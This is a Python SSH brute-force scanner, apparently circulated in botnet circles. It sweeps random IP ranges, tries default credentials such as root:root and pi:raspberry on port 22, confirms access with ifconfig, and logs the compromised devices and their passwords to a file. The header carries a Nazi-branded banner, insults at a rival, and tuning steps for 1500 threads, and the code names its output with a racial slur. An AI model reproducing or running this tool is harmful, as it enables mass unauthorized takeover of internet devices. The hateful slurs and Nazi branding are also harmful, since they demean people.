#!/usr/bin/env python
#                                         '##::: ##::::'###::::'########:'####:
#                                          ###:: ##:::'## ##:::..... ##::. ##::
#                                          ####: ##::'##:. ##:::::: ##:::: ##::
#                                          ## ## ##:'##:::. ##:::: ##::::: ##::
#                                          ##. ####: #########::: ##:::::: ##::
#                                          ##:. ###: ##.... ##:: ##::::::: ##::
#                                          ##::. ##: ##:::: ##: ########:'####:
#                                         ..::::..::..:::::..::........::....::
#		                                    If you Have this That Means you are Trusted
#                                   DO NOT TAKE PICS DO NOT SHOW ANYONE THIS DO NOT SCREEN SHARE Nazi 
# 
# 




# This Is Basically Kyro.py Renamed But Has All Of Skym3rks "private ranges" , leaked , pull hella enjoy fam :)

# Once Again Skym3rk : FUCK YOU you leaching FUCK!, im gonna enjoy ruining you .....

# MUST INSTALL THE FOLLOING BELOW

# yum update -y

# yum install nano -y

# yum install gcc python-paramiko -y

# nano /usr/include/bits/typesizes.h

# scroll down and edit the 1024 to 999999

# THEN SAVE IT 

# ulimit -n 999999

# Usage: python Nazi.py THREADS RANGES 1(slow but effective) 2(fast but less effective) HERE IS A EXAMPLE 

#       python KYRO.py 500 5.78 101

#     ^^^^^^^slow but affective ^^^^^^^^

#       python Nazi.py 500 B 119.93 3 

#     ^^^^^^Fast But Not As stable^^^^^^

# Examples Below

#  c

# python Nazi.py 500 LUCKY3 1 4

# python Nazi.py 500 LUCKY2 1 3
#ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 700 LUCKY 1 1

# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 101.108 1
# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 190.172  1
# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 179.41  1
# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python sault.py 600 B 119.92  3
# ulimit -Hn 999999; ulimit -Sn 99999; ulimit -n 99999; sysctl -w fs.file-max=100000; python Scan.py 650 B 186.39 1

#

# RANGES , 119.93, 122.3, 122.52, 101.109, 180.180, 125.27, 101.109
import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")

blacklist = [
    '127'
]

passwords = [ 
  "telnet:telnet"
  "admin:1234",
  "root:root",
  "ubnt:ubnt",
  "vagrant:vagrant",
  "pi:raspberry",
  "root:maxided"
      "root:admin",
    "root:Love2020",
    "root:Zero",
    "root:Password",
    "root:password",
    "root:qwerty",
    "root:dragon",
    "root:pussy",
    "root:baseball",
    "root:football",
    "root:monkey",
    "root:696969",
    "root:abc123"
	"admin:admin",
	"admin:1234",
	"admin:Guest",
	"ubnt:ubnt",
	"guest:guest",
	"user:user",
	"test:test",
  
]

if sys.argv[4] == '1':
     passwords = ["root:root"] # ALRIGHT 
if sys.argv[4] == '2':
     passwords = ["guest:guest"] #EHH
if sys.argv[4] == '3':
     passwords = ["admin:admin"] #ALRIGHT
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"] #SEXY
if sys.argv[4] == '5':
	passwords = ["root:root", "admin:1234", "admin:admin", "root:abc123"]
if sys.argv[4] == '6':
	passwords = ["root:admin"]

print "\x1b[1;37m~~~~~~~~~~~~~~~~~~~\x1b[1;35m"
print "\x1b[1;31m~Bruteforcing Vulnerable Devices\x1b[1;37m"
print "\x1b[1;31m~Skym3rks a skid LOL\x1b[1;37m"
print "\x1b[1;37m~~~~~~~~~~~~~~~~~~~\x1b[1;37m"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    #DONT FUCK WITH ANY OF THIS STUFF
                    elif ipclassinfo == "LUCKY":
                        lucky = ["91.99","91.98","5.74","113.53", "119.92", "223.179", "101.108", "125.24", "125.25", "125.26", "119.93"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = lucky2 = [ ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "FAST":
                        lucky2 = [  ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))

                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print '\x1b[1;31mIoT Device Found! : ' +self.host+' username: '+username+' Pass: '+password+'|'+str(port)
			ssh.exec_command("")
			nigger = open("niggers.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(0.5)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
